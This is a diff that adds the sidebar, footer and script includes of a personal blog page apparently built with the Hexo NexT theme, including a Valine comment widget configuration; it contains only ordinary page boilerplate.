+  <div class="site-description" itemprop="description">努力将一切"Regular attacks"工程化！</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-nd.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">AqYoung</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/muse.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : true,
+      appId      : 'QWm74uHDCgmhInHfKwyFBod1-gzGzoHsz',
+      appKey     : '1ktt74cyVPPjTy4P28nMIH2V',
+      placeholder: "Just go go （记得在上面留下昵称和邮箱，方便回复！）",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '5' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
